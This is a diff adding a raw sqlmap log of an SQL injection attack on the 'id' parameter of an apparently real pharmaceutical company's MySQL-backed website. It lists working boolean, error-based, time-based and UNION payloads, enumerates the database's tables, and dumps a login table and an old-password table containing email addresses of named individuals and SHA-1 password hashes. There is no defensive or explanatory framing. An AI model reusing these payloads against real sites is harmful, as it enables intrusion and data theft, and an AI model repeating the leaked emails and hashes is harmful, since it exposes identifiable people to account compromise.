@@ -1,0 +1,125 @@
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6 AND 3353=3353
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6 AND (SELECT 1186 FROM(SELECT COUNT(*),CONCAT(0x71706b7871,(SELECT (ELT(1186=1186,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=6 UNION ALL SELECT NULL,NULL,CONCAT(0x71706b7871,0x4f576b745a5946506c724151774368544c597962447378546670704e57547a78527747695367664e,0x7162716b71),NULL-- AElN
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: LiteSpeed
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] infinitu_pharma
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6 AND 3353=3353
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6 AND (SELECT 1186 FROM(SELECT COUNT(*),CONCAT(0x71706b7871,(SELECT (ELT(1186=1186,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=6 UNION ALL SELECT NULL,NULL,CONCAT(0x71706b7871,0x4f576b745a5946506c724151774368544c597962447378546670704e57547a78527747695367664e,0x7162716b71),NULL-- AElN
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: LiteSpeed
+back-end DBMS: MySQL >= 5.0
+Database: infinitu_pharma
+[7 tables]
++-----------------------+
+| cadastro_curso_evento |
+| cadastro_login        |
+| cadastro_noticia      |
+| newsletter            |
+| pagina_home           |
+| pagina_quem_somos     |
+| senha_antiga          |
++-----------------------+
+
+Database: infinitu_pharma
++-------------------+---------+
+| Table             | Entries |
++-------------------+---------+
+| newsletter        | 5058    |
+| senha_antiga      | 5       |
+| pagina_home       | 4       |
+| cadastro_login    | 3       |
+| cadastro_noticia  | 1       |
+| pagina_quem_somos | 1       |
++-------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6 AND 3353=3353
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6 AND (SELECT 1186 FROM(SELECT COUNT(*),CONCAT(0x71706b7871,(SELECT (ELT(1186=1186,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=6 UNION ALL SELECT NULL,NULL,CONCAT(0x71706b7871,0x4f576b745a5946506c724151774368544c597962447378546670704e57547a78527747695367664e,0x7162716b71),NULL-- AElN
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: LiteSpeed
+back-end DBMS: MySQL >= 5.0
+Database: infinitu_pharma
+Table: cadastro_login
+[1 entry]
++-------------+-----------+------------------------------------------+----------------------------------+--------+------------------------------------------+------------+---------------------+
+| id_cadastro | nome      | senha                                    | email                            | status | confirme                                 | tentativas | data_insercao       |
++-------------+-----------+------------------------------------------+----------------------------------+--------+------------------------------------------+------------+---------------------+
+| 11          | developer | 3f60f471730f18d25bce862e1c6a885ddbf086aa | developer@infinitumpharma.com.br | ativo  | 3f60f471730f18d25bce862e1c6a885ddbf086aa | 0          | 2015-12-03 16:15:55 |
++-------------+-----------+------------------------------------------+----------------------------------+--------+------------------------------------------+------------+---------------------+
+
+Database: infinitu_pharma
+Table: senha_antiga
+[5 entries]
++----------+---------------------+----------------------------------+------------------------------------------+
+| id_senha | data                | email                            | senha_antiga                             |
++----------+---------------------+----------------------------------+------------------------------------------+
+| 74       | 2015-09-17 21:08:52 | leodepaiva@gmail.com             | c393b34be7c74ab8250dc9a04109c9bccaacefa1 |
+| 75       | 2015-12-01 08:01:53 | leodepaiva@gmail.com             | 0f1454fb323d64099bcc764704a582ca1aa1f68c |
+| 76       | 2015-12-03 16:05:36 | alex26rj@gmail.com               | c5d1ca1033321a4fa9112690ee449ad9a3b62618 |
+| 77       | 2015-12-07 21:25:43 | developer@infinitumpharma.com.br | 3f60f471730f18d25bce862e1c6a885ddbf086aa |
+| 78       | 2016-03-21 13:30:20 | cfernandes@infinitumpharma.com   | 44f01ba706db2d173d8f63b5dad5b6f4adac617f |
++----------+---------------------+----------------------------------+------------------------------------------+
+
